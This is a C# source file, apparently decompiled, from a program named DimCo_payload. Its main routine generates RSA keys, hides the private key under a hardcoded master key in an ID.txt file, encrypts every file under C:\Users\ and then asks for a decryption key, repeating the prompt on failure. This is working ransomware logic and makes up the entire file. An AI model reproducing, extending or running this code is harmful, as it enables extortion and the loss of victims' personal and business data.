using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using DimCo_payload.Encryption;
using Newtonsoft.Json;

namespace DimCo_payload;

internal static class Program
{
	public static byte[] Base64Decode(string base64EncodedData)
	{
		return Convert.FromBase64String(base64EncodedData);
	}

	private static void decryption()
	{
		Console.WriteLine("key: ");
		setup(Console.ReadLine());
	}

	private static void setup(string xml)
	{
		foreach (string item in global.encrypted)
		{
			try
			{
				if (global.Keys.PrivateKey == null)
				{
					break;
				}
				Console.WriteLine("decrypting " + item);
				Tuple<byte[], byte[]> encoded = JsonConvert.DeserializeObject<Tuple<byte[], byte[]>>(File.ReadAllText(item));
				File.WriteAllBytes(item, DimCo_payload.Encryption.Encryption.Decrypt_File_AESRSA(encoded, xml));
				File.Move(item, Path.ChangeExtension(item, null));
			}
			catch
			{
				Console.WriteLine("Incorrect key. Try again.");
				decryption();
			}
		}
	}

	public static string Base64Encode(byte[] plainText)
	{
		return Convert.ToBase64String(plainText);
	}

	public static string[] Split(this string str, string separator)
	{
		return Regex.Split(str, separator);
	}

	private static void Main()
	{
		global.Keys = DimCo_payload.Encryption.Encryption.RSA.GenerateKeys(2048);
		string s = DimCo_payload.Encryption.Encryption.RandomString(16, 16);
		byte[] inArray = DimCo_payload.Encryption.Encryption.AES.AES_Encrypt(Encoding.UTF8.GetBytes(global.Keys.PrivateKey), Encoding.UTF8.GetBytes(s));
		byte[] inArray2 = DimCo_payload.Encryption.Encryption.RSA.Encrypt(Encoding.UTF8.GetBytes(s), 2048, global.masterkey);
		File.WriteAllText("ID.txt", Convert.ToBase64String(inArray2) + "<ID>" + Convert.ToBase64String(inArray));
		DimCo_payload.Encryption.Encryption.Encrypt_Dir("C:\\Users\\", global.Keys.PublicKey);
		decryption();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Form1());
	}
}
